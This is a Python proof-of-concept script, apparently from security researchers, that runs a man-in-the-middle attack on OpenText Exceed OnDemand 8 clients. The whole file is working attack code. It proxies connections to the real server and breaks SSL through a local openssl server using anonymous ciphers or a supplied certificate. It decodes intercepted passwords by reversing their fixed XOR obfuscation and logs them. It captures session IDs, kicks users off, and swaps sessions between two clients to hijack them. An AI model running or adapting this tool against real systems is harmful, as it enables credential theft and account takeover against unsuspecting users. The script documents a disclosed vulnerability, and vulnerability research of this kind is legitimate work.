#!/usr/bin/env python
"""
OpenText Exceed OnDemand 8 man-in-the-middle POC

@author Slawomir Jasek <Slawomir dot Jasek at securing dot pl>
@author Krzysztof Kotowicz <kkotowicz at securing dot pl>

"""
import argparse
import binascii
from itertools import cycle, izip
import SocketServer
import logging
import socket
import sys
import ssl
import subprocess
import time
import select
import multiprocessing
import fcntl, os, os.path
import random

class ExceedTamperer(object):
    """ Base class for tampering with mitm-ed traffic"""

    def tamper_sent(self,data):
        return data

    def tamper_received(self,data):
        return data

class ExceedMitmRequestHandler(SocketServer.BaseRequestHandler):
    """ Class handling connections from Exceed OnDemand clients,
        proxying them to a given self.server.remote_hosts and
        trying to man-in-the-middle SSL connections. 
        Allows for tampering with the traffic as well
    """

    def log(self, string, *args):
        logging.info('[%s:%d] ' + string, self.client_address[0], self.client_address[1], *args)
        
    def handle(self):
        """ 
        This will get called when a new TCP connection from Exceed client is established
        """

        self.log("Incoming connection from: %s %d", self.client_address[0], self.client_address[1])
        self.log("Connecting to: %s %d", self.server.remote_host, 5500)

        # connect to remote Exceed OnDemand server
        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_socket.connect((self.server.remote_host, 5500))

        # initial protocol handshake - establish versions of protocol
        data = self.request.recv(4) # '\x01\x01\x00\x00'
        self.log("Client: %s", repr(data))
        remote_socket.send(data)
        response = remote_socket.recv(4)
        self.log("Server: %s", repr(response))
        self.request.sendall(response)  # '\x0b\x00\x00\x00'

        prefix_len = None        
        if data[0:2] == '\x04\x01': # sends session id at the beginning
            prefix_len = 20

        if response[0] == '\x0b': # ssl connection, exceed v8
            return self.handle_ssl(remote_socket, prefix_len)
        elif response[0] == '\x09': # plaintext connection, exceed v8
            return self.handle_pt(remote_socket, prefix_len)
        elif response[0] == '\x03': # ssl, exceed v6
            return self.handle_ssl(remote_socket, prefix_len)
        else:
            logging.error(bcolors.FAIL + "Unknown connection!" + bcolors.ENDC)


    def send_receive(self, src, dest, back_src, back_dest, timeout = 0.2):
        sent=self.read_nonblock(src, timeout)
        if sent:
            sent = self.tamper_sent(sent)
            if hasattr(dest, 'sendall'):
                dest.sendall(sent)
            elif hasattr(dest, 'write'):
                dehst.write(sent)
            else:
                raise Exception("no sendall, no write, wtf?")
        received = self.read_nonblock(back_src, timeout)
        if received:
            received = self.tamper_received(received)
            if hasattr(back_dest, 'sendall'):
                back_dest.sendall(received)
            elif hasattr(back_dest, 'write'):
                back_dest.write(received)
            else:
                raise Exception("no sendall, no write, wtf?")

        return bool(sent or received)


    def handle_pt(self, remote_socket, prefix_len = None):
        """
            Handle non-encrypted connections. Simply proxy indefinetely
            data from client (self.request) to remote_socket and back.

        """

        if prefix_len:
            self.log("Handling prefix (%d bytes)", prefix_len)

            prefix = self.request.recv(prefix_len)
            prefix = self.tamper_sent(prefix)
            remote_socket.send(prefix)

        self.log("Establishing plaintext MITM")


        while True:
            was_traffic = self.send_receive(self.request, remote_socket, remote_socket, self.request, 0)

        self.log("Killing plaintext MITM")
        remote_socket.shutdown(socket.SHUT_RDWR)
        remote_socket.close() 

    def handle_ssl(self, remote_socket, prefix_len = None):

        """
            Handle Exceed OnDemand SSL connections. 
        """
        if prefix_len:
            logging.info("Handling prefix (%d bytes) before SSL exchange", prefix_len)

            prefix = self.request.recv(prefix_len)
            prefix = self.tamper_sent(prefix)
            remote_socket.send(prefix)

        if self.server.mitm_mode == server.MITM_NOSSL:
            logging.info("Skipping SSL mitm")
            return self.handle_pt(remote_socket)

        self.log("Server requests SSL handshake")

        # start own SSL server
        mitm_port = self.client_address[1] + 1 # hopefully free port

        self.log("Starting local SSL server at %d", mitm_port)

        if self.server.mitm_mode == server.MITM_ANON:
             # use aNULL (ADH = anonymous diffie-hellman) cipher
            openssl_parameters = ["openssl", "s_server", "-verify", "0", '-nocert', '-accept', str(mitm_port), '-ssl3', "-cipher", 'ADH', '-quiet']
        elif self.server.mitm_mode == server.MITM_CERT:
            # use server certificate
            openssl_parameters = ["openssl", "s_server", "-verify", "0", '-cert', self.server.cert, '-key', self.server.key, '-accept', str(mitm_port), '-ssl3', '-quiet']
        
        self.log(" ".join(openssl_parameters))

        openssl_p = subprocess.Popen(openssl_parameters, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

        # start SSL handshake with remote_socket using aNULL cipher (=no certificate)

        #,ssl_version=ssl.PROTOCOL_TLSv1,
        ssl_sock = ssl.wrap_socket(remote_socket,
                                   cert_reqs=ssl.CERT_NONE,
                                   do_handshake_on_connect=False,ciphers="aNULL")
        self.log("Handshaking remote SSL")
        ssl_sock.do_handshake()
        
        # needs to be nonblocking
        ssl_sock.setblocking(0)

        # put ssl server process stdin/out in non-blocking mode
        fcntl.fcntl(openssl_p.stdin.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
        fcntl.fcntl(openssl_p.stdout.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
        time.sleep(2)

        # create a local socket connected to local SSL server (no handshake yet!)
        self.log("Connecting to local SSL server")
        local_ssl_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        local_ssl_socket.connect(('localhost', mitm_port))

        self.log("Linking client msgs with local SSL")

        # Link Exceed client with our local ssl-socket
        # exceed client will complete the handshake and exchange SSL data further on
        t1 = multiprocessing.Process(target=self.forward, args=(local_ssl_socket, self.request, '<-'))
        t2 = multiprocessing.Process(target=self.forward, args=(self.request, local_ssl_socket, '->'))
        t1.start()
        t2.start()

        # by snooping at openssl process i/o we get access to plaintext
        while True:
            # proxy data between local and remote SSL
            self.send_receive(openssl_p.stdout, ssl_sock, ssl_sock, openssl_p.stdin, 0)
            
        # kill connection and all its child threads/processes
        self.log("No traffic - Terminating SSL mitm connection for %s %d", self.client_address[0], self.client_address[1])
        t1.terminate()
        t2.terminate()
        remote_socket.shutdown(socket.SHUT_RDWR)
        remote_socket.close()
        local_ssl_socket.shutdown(socket.SHUT_RDWR)
        local_ssl_socket.close()
        ssl_sock.shutdown(socket.SHUT_RDWR)
        ssl_sock.close()
        openssl_p.kill()
        time.sleep(1)
        
    def forward(self,source, destination, direction):
        """ Permanently forward data from one socket to another
        """
        string = ' '
        while string:
            string = source.recv(1024)
            if string:
                destination.sendall(string)

    def read_nonblock(self, proc, timeout = 0.2):
        """Reads all awaiting data from a socket / fd 
           in a non-blocking fashion (well, timeout is used)
        """
        ret = ''
        try_again = True
        while try_again:
            reads,writes,excs = select.select([proc],[],[], timeout)
            if reads:
                if hasattr(proc, 'recv'):
                    ret += proc.recv(2048) # drain socket - this needs to be as large as largest packet
                elif hasattr(proc, 'read'):
                    ret += proc.read(1024)
                else:
                    raise Exception("no read no recv, wtf is this") 
            else:
                try_again = False
        return ret

    def tamper_sent(self, data):
        """
            Run all registered tamperers for outgoing data
        """
        for t in self.server.tamperers:
            if hasattr(t, 'tamper_sent'):
                data = t.tamper_sent(data)
            #data = data.replace('Passive_WithShadowSetting.cfg', '/Passive.cfg\x00----------------')
        return data

    def tamper_received(self, data):
        """
            Run all registered tamperers for incoming data
        """
        for t in self.server.tamperers:
            if hasattr(t, 'tamper_received'):
                data = t.tamper_received(data)
        return data

class TCPReuseAddrServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):
    allow_reuse_address = True

class ExceedMitmServer(TCPReuseAddrServer):
    
    MITM_ANON = 1
    MITM_CERT = 2
    MITM_NOSSL = 3

    def __init__(self, server_address, RequestHandlerClass, remote_host, bind_and_activate=True):
        TCPReuseAddrServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)
        self.remote_host = remote_host
        self.tamperers = []
        self.set_mitm_mode(self.MITM_ANON) # default mode - mitm with ADH-cipher server

    def set_mitm_mode(self, mode):
        self.mitm_mode = mode

    def register_tamperer(self, tamperer):
        logging.info("Adding tamperer %s" % tamperer.__class__.__name__)
        self.tamperers.append(tamperer)

    def set_cert(self, cert, key):
        """ Set paths to certificate and key files (PEM)"""
        self.cert = cert
        self.key = key

class ExceedCredentialsDumper(ExceedTamperer):

    """ 
    Sample tamperer. Extract plaintext credentials from auth packet
    """
    def extract_credentials(self,data):

        def decode_password(passw):
            passw = binascii.unhexlify(passw)[::-1] # pass is hex-ascii encoded and reversed
            
            key = 'Hummingbird Communications Limited' # and xor-ed with this

            ciphered = ''.join(chr(ord(c)^ord(k)) for c,k in izip(passw, cycle(key)))
            return ciphered

        USER_OFFSET = 26

        user_len = ord(data[USER_OFFSET])
        user = data[USER_OFFSET+1:USER_OFFSET+1+user_len]

        pass_offset = USER_OFFSET+1+user_len

        pass_len = ord(data[pass_offset])

        pass_encoded = data[pass_offset+1:pass_offset+1+pass_len]
        passw = decode_password(pass_encoded)
        return (user, passw)

    def is_auth(self,data):
        if (len(data) > 26) and (data[0:2] == '\x11\x01'):
            return True
        return False

    def tamper_sent(self, data):
        if self.is_auth(data):
            c = self.extract_credentials(data)
            logging.warning(bcolors.WARNING + "Credentials: %s %s" + bcolors.ENDC, c[0], c[1])
        return data

class HexdumpTrafficDumper(ExceedTamperer):
    """
        Tamperer dumping all the traffic in hexdump
    """
    def hexdump(self, src, length=32):
        FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
        lines = []
        for c in xrange(0, len(src), length):
                chars = src[c:c+length]
                hex = ' '.join(["%02x" % ord(x) for x in chars])
                printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
                lines.append("%04x %-*s %s" % (c, length*3, hex, printable))
        return '\n'.join(lines)

    def tamper_sent(self, data):
        print "SENDING:"
        print self.hexdump(data)
        return data

    def tamper_received(self, data):
        print "RECEIVING:"
        print bcolors.HEADER + self.hexdump(data) + bcolors.ENDC
        return data

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''

class FileBruteForce(ExceedTamperer):

    def tamper_sent(self,data):
        #data = data.replace('\x07,s,*.xs', '\x07,c,*\x00\x00\x00')
        #data = data.replace(',s,', ',c,')
        return data

class SessionKicker(ExceedTamperer):
    def tamper_sent(self,data):
        # 20digit alfanum
        if len(data) == 20 and data.isalnum():
            if os.path.exists('sessid'): # read from file
                data = open('sessid', 'r').read()
                logging.warning(bcolors.FAIL + "Replaced session ID: %s" + bcolors.ENDC, data)
            else: # save and use dummy
                logging.warning(bcolors.WARNING + "Session ID: %s" + bcolors.ENDC, data)
                f = open('sessid', 'w')
                f.write(data)
                data = '\x00' * 20 # dummy session id, kick user
        return data

class SessionDumper(ExceedTamperer):
    def tamper_sent(self,data):
        # 20digit alfanum
        if len(data) == 20 and data.isalnum():
            logging.warning(bcolors.WARNING + "Session ID: %s" + bcolors.ENDC, data)
        return data

class SessionSwitcher(ExceedTamperer):
    
    def __init__(self):
        if os.path.exists('sessid-1'):
            os.remove('sessid-1')

        if os.path.exists('sessid-2'):
            os.remove('sessid-2')

    def tamper_sent(self,data):
        # 20digit alfanum
        if len(data) == 20 and data.isalnum():
            if os.path.exists('sessid-1'): # first was written
                tmpdata = data
                f = open('sessid-1', 'r') # read from first
                data = f.read()
                f.close()

                # write to second
                f = open('sessid-2', 'w')
                f.write(tmpdata)
                f.close()
                logging.info(bcolors.FAIL + "2nd: %s => %s" + bcolors.ENDC, tmpdata, data)

            elif os.path.exists('sessid-2'): # 2nd was written
                logging.warning(bcolors.FAIL + "!2nd exists what now?" + bcolors.ENDC)
            else: # none exist
                f = open('sessid-1', 'w') # write to first
                f.write(data)
                f.close()
                tmpdata = data
                logging.info("1st: write %s and wait", data)                
                while not os.path.exists('sessid-2'): # wait for one
                    pass
                time.sleep(0.5) # poor mand deadlock prevention
                f = open('sessid-2', 'r') # read from 2nd
                data = f.read()
                f.close()
                logging.info("1st: read %s", data)
                logging.info(bcolors.FAIL + "1st: %s => %s" + bcolors.ENDC, tmpdata, data)
        return data


if __name__ == "__main__": 
    logging.basicConfig(level=logging.INFO,format='%(message)s')
    parser = argparse.ArgumentParser(description='Exceed OnDemand man-in-the-middle PoC.')
    parser.add_argument('target_host', help="Exceed OnDemand Connection Server IP/host")
    parser.add_argument('--key', help="SSL server key file (omit to launch anonymous server)")
    parser.add_argument('--cert', help="SSL server cert file (default: %(default)s)", default="server.pem")
    parser.add_argument('--nossl', help="Don't decrypt SSL traffic", action='store_true')
    parser.add_argument('--dump', help="Dump traffic", action='store_true')
    parser.add_argument('--hijack', help="Session hijacking mode - will wait for two clients and switch sessions between them", action='store_true')

    args = parser.parse_args()
    print args

    HOST, PORT = "0.0.0.0", 5500
    logging.info("Starting server at %s:%d" % (HOST,PORT))
    server = ExceedMitmServer((HOST, PORT), ExceedMitmRequestHandler, args.target_host)
    
    if args.key:
        logging.info("Using mitm mode: SSL with certificate")
        server.set_mitm_mode(server.MITM_CERT)
        server.set_cert(args.cert, args.key)
    if args.nossl:
        logging.info("Using mitm mode: NO SSL")
        server.set_mitm_mode(server.MITM_NOSSL)

    if args.hijack:
        server.register_tamperer(SessionSwitcher())

    server.register_tamperer(SessionDumper())
    server.register_tamperer(ExceedCredentialsDumper())
    #server.register_tamperer(FileBruteForce())

    if args.dump:
        server.register_tamperer(HexdumpTrafficDumper())

    server.serve_forever()
